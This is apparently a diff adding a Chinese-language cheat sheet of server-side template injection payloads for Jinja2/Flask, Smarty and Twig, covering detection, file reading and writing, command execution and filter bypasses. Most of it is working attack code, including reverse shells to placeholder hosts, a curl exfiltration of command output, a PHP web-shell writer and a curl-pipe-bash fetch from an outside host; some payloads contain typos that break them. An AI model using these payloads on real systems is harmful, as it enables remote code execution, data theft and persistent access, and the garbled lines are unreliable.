@@ -1,0 +1,307 @@
+SSTI
+
+${7*7}
+   y a{*comment*}b
+		y Smarty
+		n ${"z".join("ab")} -> Mako
+   n {{7*7}}
+		y {{7*'7'}} -> jinja2 Twig
+		n
+
+Flask
+
+内置方法
+· __class__: 返回当前对象所属的类。例："".__class__  # <class 'str’>
+· __bases__：以元组的形式返回该类的直接父类。例："".__class__.__bases__ #(<class 'object’>,)
+· __base__：以字符串形式返回该类的基类(Object) 例："".__class__.__base__ #<class 'object’>
+· __mro__: 以元组的形式返回解析方法的调用顺序。例："".__class__.__mro__ #(<class 'str'>, <class 'object’>)
+· __subclasses__():返回类的所有子类，通常配合__class__，__base__来获取执行命令或文件操作的类。 例：().__class__.__base__.__subclasses__()
+· __init__: 返回初始化对象
+· __globals__: 以字典的形式返回当前空间下的所有可使用模块、方法以及所有变量
+· __builtins__: 返回当前所有导入的内置函数
+
+找到链再进行过滤绕过
+
+找到object对象
+''.__class__.mro__[1]
+{}.__class__.__bases__[0]
+().__class__.__bases__[0]
+[].__class__.__bases__[0]
+
+获取所有有用的class
+''.__class__.__mro__[2].__subclasses__()
+{}.__class__.__bases__[0].__subclasses__()     
+().__class__.__bases__[0].__subclasses__()
+[].__class__.__bases__[0].__subelasses__()
+{{ [].__class__.__base__.__subclasses__() }}
+{{''.__class__.___mro__()[1].__subclasses__()}}
+{{ ''__class__.__mro__[2].__subclasses__() }}
+
+文件读取
+().__class__.__bases__[0].__subclasses__()[40] ('/etc/passwd').read()
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+{{ get flashed messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+python3：在该版本中file类被删除了，不过可以利用_frozen_importlib_external.FileLoader来读取文件
+[].__class__.__mro__[1].__subclasses__()[94].get_data(0,"test.txt")
+{{[].__class__.__mro__[1].__subclasses__()[79]["get_data"](0,"/flag")}}`
+
+原理都是一样的，只不过环境变化有点大，并且Widnows与Linux下也有差异，可编写脚本遍历
+脚本遍历遍历 object 类的所有子类，查找包含 'FileLoader' 的类名，然后使用其 get_data 方法读取 test.txt 文件的内容并解码。
+{% for x in [].__class__.__mro__[1].__subclasses__() %}{% if 'FileLoader' in x.__name__ %}{{ x().get_data(x(), 'test.txt').decode() }}{% endif %}{% endfor %}
+
+文件写入
+[].__class__.__base__.__base__.__subclasses__()[40]('/tmp/1','w').write('hello')
+
+# 动态执行，例如 ?input=ls
+{% for x in().__class__.__base__.__subelasses__() %}{% if "warning" in x.__name__%}{{x().__module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}  
+
+
+
+查找想要的模块
+[].__class__.__bases__.__subelasses__().index(模块名)
+查找想要的模块
+num=0
+for item in ''.__class__.__mro__[1].__subclasses__():
+    try:
+         if 'popen' in item.__init__.__globals__:
+             print(num,item)
+         num+=1
+    except:
+        num+=1
+{% set num = 0 %}{% for item in ''.__class__.__mro__[1].__subclasses__() %}{% if 'popen' in item.__init__.__globals__ %}{{ num }}: {{ item }}{% endif %}{% set num = num + 1 %}{% endfor %}
+		
+获取全局配置：{{config}}
+		
+tplmap工具	
+测试是否存在ssti：python2 tplmap.py –u "xx"
+执行模板获取shell：python2 tplmap.py  -u "xx" --engine=jinja2 --os-shell
+
+	
+常用payload
+Python2:
+读文件().__class__.__bases__[0].__subclasses__()[40](r'/flag' ).read()
+命令执行：().__class__.__bases__[0].__subclasses__()[50].__init__.__func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
+Python3: 
+().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__['system']('1s')
+''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].system("ls")
+[].__class__.__base__.__subclasses__()[127].__init__.__globals__['system']('ls')	
+
+
+过滤
+关键字过滤 - 利用request
+利用request,args特性（cookie等）：
+# _class_
+{{().__class__.__bases__.__getitem__(0).__subclasses__().__pop(40)(request.args.path).read()}}&path=/etc/passwd
+http://localhost:5000/?exploit={{request|attr((request.args.use*2,request.args.class,request.args.use*2)|join)}}&class=class&use-_ 
+http://localhost:5000/?exploit={{request|attr(request.args_getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+过滤{{相当于盲命令执行，利用curl将执行结果带出来
+｛% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://ip: port?i=`whoami`').read()=='p' %}1{%endif %}
+
+一些像禁用了ls，cat，os等关键bypass
+[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os'].system('d'+'1'+'r')
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].system('l'+'s')
+[].__class__.__base__.__subclasses__()[59].__init__.__func_globals['linecache'].__dict__.values()[12].system('l'+'s')
+
+利用getattribute()+ 字符串拼接
+[].__class__.__base__.__subclasses__()[72].__init__.__getattribute__('__global'+'s__')['os'].system('dir')
+[].__class__.__base__.__subclasses__()[72].__init__.__getattribute__('5f5f676c6f62616c735f5f'.decode('hex'))['os'].system('dir')
+
+关键字键字过滤 - 利用hex编码
+# __builtins_
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6c\x73\x5f\x5f']
+
+过滤[]
+引入__getitem__调用字典中的键值，比如说a['b']就可以用a.getitem('b')来表示
+?name={{a.__init__.__globals__.__getitem__(request.cookies.x).eval(request.cookies.y)}}
+cookie:x=__builtins__;y=__import__("os").popen("cat /flag").read()
+
+常见过滤（’’，’, 'mro' and 'base')
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\×5f')('\x5f\x5fbuiltins\x5f\×5f')|attr('\x5f\x5fgetitem\x5f\×5f')('\x5f\x5fimport\x5f|x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+导入模块
+__import__('os')
+__import__("bf".decode('rot_13'))
+__import__('o'+'s').system("whoami")
+__import__('so'[::-1]).system('whoami')
+eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
+exec(')"imaohw"(metsys.so ;so_tropmi'[::-1])
+import importlib;importlib.import_module("os").system("whoami")
+import sys;sys.modules['os']='not allowed';del sys.modules['os'];import os 
+a=open('/usr/lib/python3.7/os.py').read();exec(a);system("whoami")
+execfile('/usr/lib/python2.7/os.py');system ("whoami") # ONLY Python2
+
+下划线
+	getattr(getattr(getattr(getattr(getattr((),dir(0)[0][0]*2+'class'+dir(0)[0][0]*2),dir(0)[0][0]*2+'bases'+dir(0)[0][0]*2),dir(0)[0][0]*2+'getitem'+dir(0)[0][0]*2)(0),dir(0)[0][0]*2+'subclasses'+dir(0)[0][0]*2)(),'pop')(37)
+	?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}
+	Cookie传参：
+	x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /f*').read()	过滤了{{
+
+使用{% 绕过再借助print()回显
+	?name={% print((abc|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))%}
+	Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__('os').popen('cat /flag').read()
+	?name={%print((x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5))%}
+	{%print(lipsum|attr(%27\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f%27))%}
+
+过滤了数字
+	构造出1  {{(dict(e=a)|join|count)}}
+关键字绕过
+	class  base  
+{{dict(__cl=a,ass__=a)|join}}
+还可以使用全角的数字绕过
+	０１２３４５６７８９
+
+SSTI武器库
+1、任意命令执行
+{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__['popen']('dir').read()%}{%endif%}{%endfor%}
+2、任意命令执行
+{{"".__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__['popen']('cat /flag').read()}}
+//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload
+3、任意命令执行
+{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
+4、任意命令执行
+{{x.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}
+//x的含义是可以为任意字母，不仅仅限于x
+5、任意命令执行
+{{config.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat flag').read()")}}
+6、文件读取
+{{x.__init__.__globals__['__builtins__'].open('/flag', 'r').read()}}
+//x的含义是可以为任意字母，不仅仅限于x
+
+# 命令执行_eval
+ {% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}{{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}{% endif %}{% endfor %}
+# 命令执行_os.py
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'os' in x.__init__.__globals__ %}{{ x.__init__.__globals__['os'].popen('ls /').read() }}{% endif %}{% endfor %}
+# 命令执行_popen
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'popen' in x.__init__.__globals__ %}{{ x.__init__.__globals__['popen']('ls /').read() }}{% endif %}{% endfor %}
+# 命令执行__frozen_importlib.BuiltinImporter
+{% for x in [].__class__.__base__.__subclasses__() %}{% if 'BuiltinImporter' in x.__name__ %}{{ x["load_module"]("os")["popen"]("ls /").read() }}{% endif %}{% endfor %}
+# 命令执行_linecache
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'linecache' in x.__init__.__globals__ %}{{ x.__init__.__globals__['linecache']['os'].popen('ls /').read() }}{% endif %}{% endfor %}
+# 命令执行_exec(无回显故反弹shell)
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}{{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("HOST_IP",Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')}}{% endif %}{% endfor %}
+{{().__class__.__bases__[0].__subclasses__()[216].__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("VPS_IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')}}
+# 命令执行_catch_warnings 
+{% for x in [].__class__.__base__.__subclasses__() %}{% if 'war' in x.__name__ %}{{ x.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
+# catch_warnings 读取文件
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__name__=='catch_warnings' %}{{ x.__init__.__globals__['__builtins__'].open('/app/flag', 'r').read() }}{% endif %}{% endfor %}
+# _frozen_importlib_external.FileLoader 读取文件
+ {% for x in [].__class__.__base__.__subclasses__() %} # {% for x in [].__class__.__bases__[0].__subclasses__() %}{% if 'FileLoader' in x.__name__ %}{{ x["get_data"](0,"/etc/passwd")}}{% endif %}{% endfor %}
+# 其他RCE
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+{{g.pop.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{url_for.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{get_flashed_messages.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{application.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{self.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{cycler.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{joiner.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{namespace.__init__.__globals__.__builtins__['__import__']('os').popen('ls').read()}}
+{{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('ls').read)}}
+
+思路一：如果object的某个派生类中存在险方法，就可以直接拿来用
+
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'eval' in x.__init__.__globals__['__builtins__']['eval'].__name__ %}{{ x.__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()') }}{% endif %}{% endfor %}
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'os' in x.__init__.__globals__ %}{{ x.__init__.__globals__['os'].popen('ls /').read() }}{% endif %}{% endfor %}
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'popen' in x.__init__.__globals__ %}{{ x.__init__.__globals__['popen']('ls /').read() }}{% endif %}{% endfor %}
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'linecache' in x.__init__.__globals__ %}{{ x.__init__.__globals__['linecache']['os'].popen('ls /').read() }}{% endif %}{% endfor %}
+{% for x in [].__class__.__base__.__subclasses__() %}{% if x.__init__ is defined and x.__init__.__globals__ is defined and 'linecache' in x.__init__.__globals__ %}{{ x.__init__.__globals__['linecache']['os'].popen('ls /').read() }}{% endif %}{% endfor %}
+{% for x in [].__class__.__base__.__subclasses__() %}
+    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}
+        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("123.3.3.3",111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')}}
+    {% endif %}
+{% endfor %}
+
+# Python3
+object.__subclasses__()[37].__call__(eval, "__import__('os').system('whoami')")# Python2
+object.__subclasses__()[29].__call__(eval, "__import__('os').system('whoami')")
+object.__subclasses__()[40]('.bash_history').read()
+
+思路二：objecL的某个派生类导人了他险模块，就可以链式调用危险方法
+{% for cls in [].__class__.__base__.__subclasses__() %}
+    {% if cls.__init__ is defined and cls.__init__.__globals__ is defined %}
+        {% set sys_module = cls.__init__.__globals__.get('sys', None) %}
+        {% if sys_module and 'os' in sys_module.modules %}
+            {{ sys_module.modules['os'].system('whoami') }}
+        {% endif %}
+    {% endif %}
+{% endfor %}
+
+
+# Python3
+object.__subclasses__()[134].__init__.__globals__['sys'].modules['os'].system('whoami')
+object.__subclasses__()[134].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
+# Python2
+object.__subclasses__()[59].__init__.__globals__['sys'].modules['os'].system('whoami')
+object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('whoami')
+
+思路三
+{% for cls in [].__class__.__base__.__subclasses__() %}
+    {% if cls.__init__ is defined and cls.__init__.__globals__ is defined %}
+        {% set collections_module = cls.__init__.__globals__.get('_collections_abc', None) %}
+        {% if collections_module and collections_module.__dict__.get('sys', None) %}
+            {{ collections_module.__dict__['sys'].modules['os'].system('whoami') }}
+        {% endif %}
+    {% endif %}
+{% endfor %}
+
+# Python3
+object.__subclasses__()[170].__init__.__globals__['_collections_abc'].__dict__('sys').modules['os'].system('whoami')
+# Python2
+object.__subclasses__()[59].__init__.__globals__['11necache'].__dict__['sys'].modules['os'],system('whoami')
+特例：
+# Python3
+object.__subclasses__()[134]().__module__.__builtins__['__import__']('os').system('whoami')
+# Python2
+object.__subclasses__()[59]().__module__.__builtins__['__import__']('os').system('whoami")
+
+思路四 ：基本类型的某些方法属于特殊方法，可以通过链式调用
+{% for cls in [].__class__.__base__.__subclasses__() %}
+    {% if cls.__init__ is defined and cls.__init__.__globals__ is defined %}
+        {% set collections_module = cls.__init__.__globals__.get('_collections_abc', None) %}
+        {% if collections_module and collections_module.__dict__.get('sys', None) %}
+            {{ collections_module.__dict__['sys'].modules['os'].system('whoami') }}
+        {% endif %}
+    {% endif %}
+{% endfor %}
+
+[].append.__class__.__call__(eval, "__import__('os').system('whoami')")
+
+
+
+{{get_flashed_message(可替换任意xxx读文件绕过(cat绕过)).__init__.__globals__}}
+找 __builtins__再找__import__->['__import__']('os').popen('cat /flag').read()
+					__open__->['open'](/flag).read()%20
+					.__builtins__['eval']("__import__('os').popen('cat /flag').read()")}}
+
+
+==================================================================================================================================================================================================================================
+
+
+
+Smarty
+//｛php｝标签执行php代码
+{phplecho id ;l/php} 
+Getshell
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+RCE
+{system('ls')}
+{if show_source ('/flag')}{/if}
+反弹shell:
+{system('curl http://d.ylng.vip:12390/dev.txt|bash')}
+
+
+Twig
+使用`{{_self.env.getFilter}}`报错，可以判断是Twig(报错后需要清空浏览器记录在重新访问，title也提示了是cookie)。于是抓包修改cookie中的user值，利用一下payload直接执行命令
+```twig
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+RCE
+{{self}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}//这两个一起的
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+
